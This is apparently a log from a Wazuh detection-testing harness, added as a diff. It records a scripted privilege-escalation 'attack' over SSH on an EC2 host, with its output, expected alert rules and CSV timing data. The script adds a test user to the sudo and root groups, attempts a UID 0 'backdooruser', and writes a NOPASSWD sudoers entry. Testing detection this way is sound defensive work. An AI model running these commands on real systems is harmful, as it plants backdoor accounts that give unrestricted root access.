@@ -1,0 +1,111 @@
+===============================================================================
+[1;33mATTACK #08: User Added to Admin Group[0m
+===============================================================================
+Target: ec2-54-204-182-4.compute-1.amazonaws.com
+Category: Privilege Escalation
+
+[0;32m[*] Attack started at: 2026-01-05T18:53:31+03:00[0m
+
+[*] Commands to run on target agent:
+
+
+#!/bin/bash
+echo "[*] User privilege escalation attack..."
+
+TEST_USER="testattacker"
+
+# 1. Create a new user
+echo "[*] Creating test user: $TEST_USER"
+sudo useradd -m -s /bin/bash "$TEST_USER" 2>/dev/null || echo "    User may already exist"
+
+# 2. Add user to sudo group
+echo "[*] Adding user to sudo group..."
+sudo usermod -aG sudo "$TEST_USER" 2>/dev/null || \
+sudo usermod -aG wheel "$TEST_USER" 2>/dev/null || \
+echo "    Could not add to sudo/wheel group"
+
+# 3. Add user to admin group
+echo "[*] Adding user to admin group..."
+sudo usermod -aG admin "$TEST_USER" 2>/dev/null || echo "    admin group may not exist"
+
+# 4. Add user to root group (dangerous in real scenario)
+echo "[*] Adding user to root group..."
+sudo usermod -aG root "$TEST_USER" 2>/dev/null || echo "    Could not add to root group"
+
+# 5. Create user with specific UID (UID 0 = root)
+echo "[*] Attempting to create user with low UID..."
+sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash "backdooruser" 2>/dev/null || \
+echo "    Could not create UID 0 user (expected)"
+
+# 6. Modify /etc/passwd to add root-level user (simulation)
+echo "[*] Simulating /etc/passwd modification..."
+echo "# Simulated backdoor entry" | sudo tee -a /tmp/passwd_simulation > /dev/null
+echo "backdoor:x:0:0:root:/root:/bin/bash" | sudo tee -a /tmp/passwd_simulation > /dev/null
+
+# 7. Add sudoers entry directly
+echo "[*] Creating sudoers entry..."
+echo "$TEST_USER ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/test_backdoor > /dev/null 2>&1
+
+# 8. Verify changes
+echo ""
+echo "[*] Verifying user privileges..."
+id "$TEST_USER" 2>/dev/null
+groups "$TEST_USER" 2>/dev/null
+sudo -l -U "$TEST_USER" 2>/dev/null | head -5
+
+echo ""
+echo "[*] Waiting for detection..."
+sleep 10
+
+# Cleanup
+echo "[*] Cleaning up..."
+sudo userdel -r "$TEST_USER" 2>/dev/null
+sudo userdel -r "backdooruser" 2>/dev/null
+sudo rm -f /etc/sudoers.d/test_backdoor 2>/dev/null
+sudo rm -f /tmp/passwd_simulation
+
+echo "[*] Cleanup complete"
+
+[*] Running attack via SSH using key /home/mohamad/.ssh/wazuh-agnet.pem ...
+[*] User privilege escalation attack...
+[*] Creating test user: testattacker
+[*] Adding user to sudo group...
+[*] Adding user to admin group...
+[*] Adding user to root group...
+[*] Attempting to create user with low UID...
+    Could not create UID 0 user (expected)
+[*] Simulating /etc/passwd modification...
+[*] Creating sudoers entry...
+
+[*] Verifying user privileges...
+uid=1001(testattacker) gid=1001(testattacker) groups=1001(testattacker),0(root),27(sudo),118(admin)
+testattacker : testattacker root sudo admin
+Matching Defaults entries for testattacker on ip-172-31-28-229:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User testattacker may run the following commands on ip-172-31-28-229:
+    (ALL) ALL
+
+[*] Waiting for detection...
+[*] Cleaning up...
+[*] Cleanup complete
+
+===============================================================================
+[0;32m[✓] Attack script generated[0m
+===============================================================================
+Start Time: 2026-01-05T18:53:31+03:00
+End Time: 2026-01-05T18:53:43+03:00
+
+Expected Wazuh alerts:
+  - Rule 5904: User added to privileged group
+  - Rule 5905: New user added
+  - Rule 5906: User account modification
+  - Rule 5141: New account created
+  - Sudoers modification alerts
+
+Data for CSV:
+  attack_id: 08
+  attack_name: User Added to Admin Group
+  category: Privilege Escalation
+  attack_start_time: 2026-01-05T18:53:31+03:00
+  attack_end_time: 2026-01-05T18:53:43+03:00
